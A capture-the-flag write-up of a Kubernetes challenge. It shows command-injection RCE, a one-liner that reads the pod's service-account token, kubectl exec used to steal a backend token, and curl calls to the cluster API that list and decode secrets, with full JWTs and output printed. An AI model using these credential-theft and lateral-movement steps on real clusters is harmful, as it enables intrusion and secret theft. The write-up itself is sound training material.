<img width="256" height="256" alt="image" src="https://github.com/user-attachments/assets/a4cb4727-3efc-4e95-9ce4-7bc0dc111128" />

<img width="256" height="128" alt="530627898-a4cb4727-3efc-4e95-9ce4-7bc0dc111128" src="https://github.com/user-attachments/assets/0e0ebded-1070-4b2c-9563-e06d2fc499c8" />

## Mini Kubernetes

This CTF involves exploiting a Kubernetes misconfigurations to capture 3 flags.

### Tools Used
- `kubectl` - Pre-installed in pod

### Initial Recon

URL: `http://77.42.16.86:30000/`

The web app has a command injection vulnerability allowing RCE.

One liner command to enumerate the environment:
```bash
whoami; id; hostname; env | grep -i kube; env | grep -i flag; env; cat /proc/mounts; df -h; ip addr; cat /etc/resolv.conf; ps aux; which kubectl; which curl; which wget; which tcpdump; cat /run/secrets/kubernetes.io/serviceaccount/token; cat /run/secrets/kubernetes.io/serviceaccount/namespace;
```

Results
```
root
uid=0(root) gid=0(root) groups=0(root)
frontend-app-5889955bfd-nsk97
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.96.0.1:443
FRONTEND_SERVICE_PORT=tcp://10.96.178.212:5000
FRONTEND_SERVICE_SERVICE_PORT=5000
HOSTNAME=frontend-app-5889955bfd-nsk97
HOME=/root
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
PYTHON_SHA256=00e07d7c0f2f0cc002432d1ee84d2a40dae404a99303e3f97701c10966c91834
WERKZEUG_SERVER_FD=3
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
LANG=C.UTF-8
FRONTEND_SERVICE_PORT_5000_TCP_ADDR=10.96.178.212
FRONTEND_SERVICE_PORT_5000_TCP_PORT=5000
PYTHON_VERSION=3.9.25
FRONTEND_SERVICE_PORT_5000_TCP_PROTO=tcp
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/app
FRONTEND_SERVICE_SERVICE_HOST=10.96.178.212
FRONTEND_SERVICE_PORT_5000_TCP=tcp://10.96.178.212:5000
overlay / overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/77/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/74/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/73/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/69/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/63/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/work,uuid=on,nouserxattr 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
cgroup /sys/fs/cgroup cgroup2 ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0
/dev/sda1 /etc/hosts ext4 rw,relatime 0 0
/dev/sda1 /dev/termination-log ext4 rw,relatime 0 0
/dev/sda1 /etc/hostname ext4 rw,relatime 0 0
/dev/sda1 /etc/resolv.conf ext4 rw,relatime 0 0
shm /dev/shm tmpfs rw,relatime,size=65536k,inode64 0 0
tmpfs /run/secrets/kubernetes.io/serviceaccount tmpfs ro,relatime,size=15982940k,inode64,noswap 0 0
overlay /sys/devices/virtual/dmi/id/product_name overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/77/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/74/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/73/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/69/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/63/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/work,uuid=on,nouserxattr 0 0
overlay /sys/devices/virtual/dmi/id/product_uuid overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/77/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/74/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/73/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/69/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/63/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/work,uuid=on,nouserxattr 0 0
overlay /sys/devices/virtual/dmi/id/product_uuid overlay ro,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/77/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/74/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/73/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/71/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/69/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/63/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/89/work,uuid=on,nouserxattr 0 0
proc /proc/bus proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/fs proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/irq proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sys proc ro,nosuid,nodev,noexec,relatime 0 0
proc /proc/sysrq-trigger proc ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime,inode64 0 0
tmpfs /proc/interrupts tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/latency_stats tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755,inode64 0 0
tmpfs /proc/scsi tmpfs ro,relatime,inode64 0 0
tmpfs /sys/firmware tmpfs ro,relatime,inode64 0 0
Filesystem      Size  Used Avail Use% Mounted on
overlay         301G  4.9G  284G   2% /
tmpfs            64M     0   64M   0% /dev
/dev/sda1       301G  4.9G  284G   2% /etc/hosts
shm              64M     0   64M   0% /dev/shm
tmpfs            16G   12K   16G   1% /run/secrets/kubernetes.io/serviceaccount
tmpfs           7.7G     0  7.7G   0% /proc/acpi
tmpfs           7.7G     0  7.7G   0% /proc/scsi
tmpfs           7.7G     0  7.7G   0% /sys/firmware
search frontend.svc.cluster.local svc.cluster.local cluster.local
nameserver 10.96.0.10
options ndots:5
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtkUmNLUVhKaE1nd3lneENNQjBIS0JKUkhHYWx5SVJ6ZURqMmc3VWk4b00ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDYyOTUxLCJpYXQiOjE3NjY5MjY5NTEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNzJiNTJlZWYtMTZjNC00ODg2LWExZGUtODEyMGE4YTMzYmMzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJmcm9udGVuZCIsIm5vZGUiOnsibmFtZSI6InRlc3QtY3RmLWNvbnRyb2wtcGxhbmUiLCJ1aWQiOiI5Yzk2MDU0Ny0wNTFmLTQzOTItODUzOS1kMzdjZGNmYTAyYTIifSwicG9kIjp7Im5hbWUiOiJmcm9udGVuZC1hcHAtNTg4OTk1NWJmZC1uc2s5NyIsInVpZCI6IjQxOWZhNzg5LWFmNWEtNGFjMy1hYWZlLTY0MjU0MmNhMDY5NSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZnJvbnRlbmQtc2EiLCJ1aWQiOiI1ZWE5ZjA5Ny02YzRmLTQ0NDItYjVjZC01ZDVhYjY2Y2VlY2MifSwid2FybmFmdGVyIjoxNzY2OTMwNTU4fSwibmJmIjoxNzY2OTI2OTUxLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZnJvbnRlbmQ6ZnJvbnRlbmQtc2EifQ.tVFyUZ3gllNXaz5Ah3xnsIDcEW__YPe-tkgoxvJQ-lX7comWWR9WHYS2wePtLszGa-3diqe2tv9f_IeTMg4vt_DhD7L_Of7Iav_FlLs2l-c9S5rvlaNCwR88flAidyYmWkEv4t_4Tl8mhHHt9dIkVSbrbJjtnc8ZJNO1FlXBJOjpg9nksC3Krx6UVIxvz81Qd3SFJDkfiun1DoT1VdjQEJFUe4MGkvR7YALcnrYk2ofnRz3RcIgyZ4ja8NSe2DmRV0_7JnuwiVlwpdJhMoSBbihkoIA6_FJ2F2gVg4-_s5u8axzj-Z05IL0g5t-stwC34rjU3m6p2KTyhwnZb3gURg
frontend
```

**Key findings:**
- Running as `root`
- Pod: `frontend-app-5889955bfd-fngwb`
- Namespace: `frontend`
- Service Account: `frontend-sa`
- `kubectl` binary available at `/app/kubectl`
- Frontend Token

---

### Permissions

```bash
/app/kubectl auth can-i --list
```

The `frontend-sa` has limited permissions - mainly just list namespaces.

<img width="1065" height="609" alt="image" src="https://github.com/user-attachments/assets/a99983b0-5aab-43cc-97ad-cafa3d460504" />

### Discover namespaces

```bash
/app/kubectl get namespaces
```
<img width="452" height="350" alt="image" src="https://github.com/user-attachments/assets/b5679188-899c-4cb8-8297-54605defda3e" />

There are few namespaces, but let's checks if we can list backend pods running. 

```bash
/app/kubectl get pods -n backend
```
Found multiple `backend-api` pods running (during the challenge on going, the screenshot was when ctf ended)

<img width="661" height="131" alt="image" src="https://github.com/user-attachments/assets/972e6560-d521-4887-a99b-43d0af42d3fd" />

### Steal backend token

Since we can exec into backend pods, let's steal their service account token:

```bash
/app/kubectl exec backend-api-746fcc985-2jrj5 -n backend -- cat /run/secrets/kubernetes.io/serviceaccount/token
```
**Stolen token:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtkUmNLUVhKaE1nd3lneENNQjBIS0JKUkhHYWx5SVJ6ZURqMmc3VWk4b00ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDYzMDIyLCJpYXQiOjE3NjY5MjcwMjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZTcyYmFiMzMtOTdlNC00YjkyLThhMTItMjNjNGZkNDYzY2MxIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjljOTYwNTQ3LTA1MWYtNDM5Mi04NTM5LWQzN2NkY2ZhMDJhMiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS02bnpjZiIsInVpZCI6IjUyZGZjOTFhLTE5ZDAtNGMyMS04ZGU5LWFkMTBiYmQ2ODliOCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjA4MmQ5ZDE5LTJiMzktNDc1Zi04YmJiLWExY2RhNjNhNGY4NyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MzA2Mjl9LCJuYmYiOjE3NjY5MjcwMjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.T1t1OB2Wh2VNksNqmZdGlbwjJyPRwYM88DQT280sc4fLtPzo6ltIRMmiQ_oNoJd0hiPWBgZGqv3gP5XQ3zg2S5oarc5WWxwnyOhS5nXSzR_NQiJmWsK0qRjNU0U8wB6LrSaqRZU4QV4hb8da7vu3AFcxRgnYiW478Ma9G4o2Za1hTnWZoR6QbhZZgwefi6ONI1fsL-JbHMfvjemf2nETH2S49xOU46CtNUHggD8Kf_6pzllWZN2VCZCbQI38kJ93UGuSryUKDCRLEiAiuSHQu0ZPbJrJUwfbWTOMoGPMK8LxVsEwyXND1QriYraIh5HDpTmVeLttJgg_3_S3T1HDcQ
```

This `backend-sa` token has higher privileges than our `frontend-sa`.

### Search all namespaces for secrets

Using the stolen **backend-sa** token to scan for flag secrets:

```bash
for ns in frontend backend default win-namespace kube-system; do echo "=== Checking $ns for flags==="; curl -sk -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/$ns/secrets 2>/dev/null | grep '"name"' | grep -E "flag|final|win"; done
```

**Result:**
- `flag1` in frontend namespace
- `flag2` in backend namespace  
- `flag3-master-treasure` in win-namespace

### Flag 1: Initial Compromise

```bash
curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/frontend/secrets/flag1 2>/dev/null | grep '"flag"' | cut -d'"' -f4 | base64 -d
```

**Flag:** `RE:CTF{initial_compromise_via_rce_success}`

### Flag 2: Lateral Movement

```bash
curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/backend/secrets/flag2 2>/dev/null | grep '"flag"' | cut -d'"' -f4 | base64 -d
```

**Flag:** `RE:CTF{lateral_move_to_backend_success}`

### Flag 3: Master Treasure

```bash
curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik9xSEdlQXl2eXl6dTZlSGxwQ0NGYU51Mk5DQzBBOWlEQmVXa1VwMjd1RGsifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzk4NDM2ODY3LCJpYXQiOjE3NjY5MDA4NjcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWExNDg2ZGItODgxZC00YzhmLWExNGItZmJmYmU3NDVlNTQzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiYWNrZW5kIiwibm9kZSI6eyJuYW1lIjoidGVzdC1jdGYtY29udHJvbC1wbGFuZSIsInVpZCI6IjgyZWJhOWU0LTRiNWItNDYwMS1iYTVkLWMxMTdjNDcyN2UzNiJ9LCJwb2QiOnsibmFtZSI6ImJhY2tlbmQtYXBpLTc0NmZjYzk4NS0yanJqNSIsInVpZCI6ImU4ZjJiOTRhLWU4MzMtNDA0Ny1iOTRhLTZjNDBiMGUxOGVhNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiYmFja2VuZC1zYSIsInVpZCI6IjNkNzliZWUwLWQ5NDQtNGQ2NC1hOGJkLTllNDA0ZDAyZDkxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NjY5MDQ0NzR9LCJuYmYiOjE3NjY5MDA4NjcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiYWNrZW5kOmJhY2tlbmQtc2EifQ.Azt7a_bna9G7sGXyAxQbeb6mgCVrU0Q1JITC4M5Ko6EeCyS4plo3eepaZQuBMlvGiVgLtMLjetZqx2Zk_HkICZidhUc5aAP18U2_NNMixL2bH8jMTW_a1QMKXHLdcKs7pqkQxafQQGU0C9doZHv1X590SiJRKkAdw7H0qsqd-QCv8n_3YpqmdOYjUtsnA3-DW8TI90dKu6nuzCEWoT-dPJ08WCdQ9WLpHVZkIH-R_MmjjWO9d1xOwMMy_ArNAyHLljOa6NzDE-YgWeYGjdbGPgkkENSsjGtzTDxZ5Q_rx7pEMpL_gUzxpvBAuZPap8MzM4mIsCBj1MQ4pxzi8DNYzg" https://10.96.0.1/api/v1/namespaces/win-namespace/secrets/flag3-master-treasure 2>/dev/null | grep '"flag"' | cut -d'"' -f4 | base64 -d
```

**Flag:** `RE:CTF{you_are_k8s_master_congratulations}`

**References:**
- [K8s LAN Party CTF Writeup](https://arnavtripathy98.medium.com/solving-a-kubernetes-ctf-k8s-lan-party-c773190e9246)
- [Kubernetes Hacking Challenge at Area41](https://www.redguard.ch/blog/2024/06/12/kubernetes-hacking-challenge-at-area41/)
- `curl` - Direct K8s API requests
- `base64` - Decode secrets
